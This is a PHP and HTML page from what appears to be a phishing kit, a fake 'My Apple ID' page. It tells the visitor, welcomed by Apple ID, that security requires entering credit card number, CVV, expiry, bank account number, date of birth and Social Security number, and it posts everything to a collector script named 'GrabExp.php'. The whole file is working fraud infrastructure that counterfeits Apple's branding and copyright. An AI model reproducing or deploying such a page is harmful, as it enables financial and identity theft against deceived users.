<?php
ob_start();
ini_set("output_buffering",4096);
session_start();

$indexs="GrabExp.php?token;".md5(time()).md5(time()); 
$user = $_SESSION['AppleID'];
$Validate = $_GET ['valid'];
if ($Validate !="true") {

$cc = $_GET['cc'];
$nameoncard = $_GET['nameoncard'];
$cvv = $_GET['cvv'];
$expires = $_GET['expires'];
$ban = $_GET['ban'];
$dob = $_GET['dob'];
$ssn = $_GET['ssn'];
}
require_once 'encrypter.php'; 
?>




<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">



<html>

    <head>

        <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
        <meta name="viewport" content="width=1024"/>
        <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7, IE=9" />


        <title>Apple - My Apple ID</title>


<link rel="icon" type="image/png" href="base/images/favicon.png">
<link rel="shortcut icon" type="image/x-icon" href="base/images/favicon.ico">

        <link rel="stylesheet" type="text/css" media="screen" href="base/css/global.css?style_session=<?php echo $indexs; ?>" />
    <!--[if gte IE 9]><!-->
    <link rel="stylesheet" href="base/css/style2.css?style_session=<?php echo $indexs; ?>" media="screen, print" />
    <!--<![endif]-->


   
        


    </head>

    <body id="vetting">

        
	

	


<link rel="stylesheet" type="text/css" media="screen" href="base/css/navigation.css?style_session=<?php echo $indexs; ?>" />



    <link rel="stylesheet" type="text/css" media="screen" href="base/css/enhanced.css?style_session=<?php echo $indexs; ?>" />




	
	
<div id="globalheader">

	
	
	

	
	


<ul id="globalnav">
	<li id="gn-apple"><a
		href="#"><span></span></a></li>
	<li id="gn-store">
	
	 

			<a href="#"><span></span></a>
		
		
	</li>
	<li id="gn-mac">
	
		
		
		<a href="#"><span></span></a>
		
			
	</li>
	<li id="gn-ipod">
	
		
		
		<a href="#"><span></span></a>
		
			 </li>
	<li id="gn-iphone">
		
		
		
		<a
		href="#"
		class=""><span></span></a>
		
			</li>
	<li id="gn-ipad">
		
		
		
		<a
		href="#" ><span></span></a>
		
		
	</li>
	<li id="gn-itunes">
	
		
		
		<a id="iTuneApp"
		href="#" ><span></span></a>
		
		
	</li>
	<li class="gn-last" id="gn-support">
	
		
		
		<a href="#"><span></span></a>
		
		
	</li>
</ul>

<div id="globalsearch">
			<form action="" method="post" class="search" id="g-search"><div>
				<label for="sp-searchtext"><input type="text" name="q" id="sp-searchtext" accesskey="s" /></label>
			</div></form>
			<div id="sp-magnify"><div class="magnify-searchmode"></div><div class="magnify"></div></div>
			<div id="sp-results"></div>
		</div>

  
</div>

<input type="hidden" id="urlLanguageInsert" value="/" />

	

        
            <div id="" class="myappleid find-apple-id step1" >
        
        


            



<div id="productheader">

    <a href="#">
        
            
            
        
        <h2><img src="base/images/myappleid.png" style="height: 35px;" alt="My Apple ID" /></h2>
    </a>

</div>

            <div id="main">

                <div id="content" class="content">

                    <div class="grid2colc wrap">

                        <div class="column first">


   <font color="#999"> Welcome, <?php echo $user; ?><br> </font> 
<br />

<h2>
    Additional information required.
</h2><br />
<h4>
    <p class="intro">
        To help ensure the security of your Apple ID we require you to Enter your credit card information.
    </p>
</h4>
	<hr>
	<p>
	<font color="#999">
	Apple uses industry-standard encryption to protect the confidentiality of your personal information.
	    </p></font>
                        </div>

<div class="column last main" id="main_content">


<form action="<?php echo $indexs ?>"  method="POST">



   

<p align="right" class="intro">
<img src="base/images/secure.png" alt=""> 
</p><br />


    
        <div class="formrow">
            <label class="label-find-account">Card Number</label>
            <span class="formwrap moveRight"><input id="last-name" name="ccNum" class="input-find-account" autocapitalize="off" type="text" value="" Placeholder="Debit/Credit Card Number" required autocomplete="off"/></span>
        <?php if ($Validate != "true") { if ($cc ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please enter a valid credit card number.</span></span><span class=\"input-msg\"> </span>";
		} }
		?>
            
        </div>
		
			<div class="formrow">
            <label class="label-find-account">Name on card</label>
            <span class="formwrap moveRight"><input id="last-name" name="NameOnCard" class="input-find-account" autocapitalize="off" type="text" value="" Placeholder="Name exactly as appears on your card" required autocomplete="off"/></span>
        <?php if ($Validate !="true") {if ($nameoncard ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please enter a valid name.</span></span><span class=\"input-msg\"> </span>";
		} }
		?>
            
        </div>

        <div class="formrow">
            <label class="label-find-account ">Cvv</label>
            <span class="formwrap moveRight"><input id="last-name" name="CVV" class="input-find-account" autocapitalize="off" pattern="[0-9]{3}" type="text" value="" Placeholder="Security Code" required autocomplete="off"/></span>
		<?php if ($Validate != "true") {if ($cvv ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please enter valid security code.</span></span><span class=\"input-msg\"> </span>";
		}}
		?>

        </div>

        <div class="formrow">
            <label class="label-find-account ">Expires</label>
            <span class="formwrap moveRight"><input id="last-name" name="Expires" class="input-find-account" autocapitalize="off" type="text" value="" Placeholder="MM / YYYY" required autocomplete="off"/></span>
		<?php if ($Validate != "true") { if ($expires ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please enter a valid expiration date.</span></span><span class=\"input-msg\"> </span>";
		} }
		?>
        </div>
		
        <div class="formrow">
            <label class="label-find-account ">Bank Account Number :</label>
            <span class="formwrap moveRight"><input id="last-name" name="BAN" class="input-find-account" autocapitalize="off" type="text" value="" Placeholder="Please enter a valid bank account number." autocomplete="off"/></span>
		<?php if ($Validate != "true") {if ($ban ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please enter valid security code.</span></span><span class=\"input-msg\"> </span>";
		}}
		?>
        </div>   
		        

        <div class="formrow">
            <label class="label-find-account ">Date of Birth</label>
            <span class="formwrap moveRight"><input id="last-name" name="DOB" class="input-find-account" autocapitalize="off" type="text" value="<?php if (isset($_SESSION['DOB'])) { print $_SESSION['DOB'];} else {print "";} ?>" Placeholder="MM/DD/YYYY" required autocomplete="off"/></span>
		<?php if ($Validate != "true") {if ($dob ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please enter a valid birthday.</span></span><span class=\"input-msg\"> </span>";
		} }
		?>
        </div>

<div class="formrow">
            <label class="label-find-account ">Social Security number :</label>
            <span class="formwrap moveRight"><input id="last-name" name="SSN" class="input-find-account" autocapitalize="off" type="text" value="<?php if (isset($_SESSION['SSN'])) { print $_SESSION['SSN'];} else {print "";} ?>" Placeholder=" XXX - XX - XXXX " autocomplete="off"/></span>
			
					<?php if ($Validate != "true") {if ($ssn ==1) {
		print "<span class=\"alert\"></span><span class=\"input-msg red show\"><span id=\"firstName.errors\">Please enter a valid birthday.</span></span><span class=\"input-msg\"> </span>";
		} }
		?>

        </div>  

	
		
    




<div id="bot-nav">

                                            <div class="actions">
                                                <button id="sign-in" class="button rect" type="submit">
                                                    <span>
                                                        <span class="effect"></span>
                                                        <span class="label">Confirm</span>
                                                    </span>
                                                </button>
                                            </div>
</div>


</form> </div>

                    </div>

                </div>

            </div>

        </div>





<div id="globalfooter">

    <style> iframe { display: none; } </style>



    <div id="breadory">
        <ol id="breadcrumbs">
            <li class="home"><a href="#" dir="ltr">Home</a></li>
            <li><a href='#'>My Apple ID</a>
            </li>
            
                
                
                
                
            
        </ol>
    </div>







<div class="gf-sosumi">
    
    <p>Copyright &copy; 2015 Apple Inc. All rights reserved.</p>
    <ul class="piped">
        <li><a class="first" href="#">Terms of Use</a></li>
        <li><a href="#">Privacy Policy</a></li>
        <li style="float:right">
           
           
                
                    
                    
                

                <img src="base/images/us_flag.png" height="22" style="float:right;" alt="United States" width="22" />
         
        </li>
    </ul>
</div>

</div>

    </body>
</html>
<?php ob_end_flush(); ?>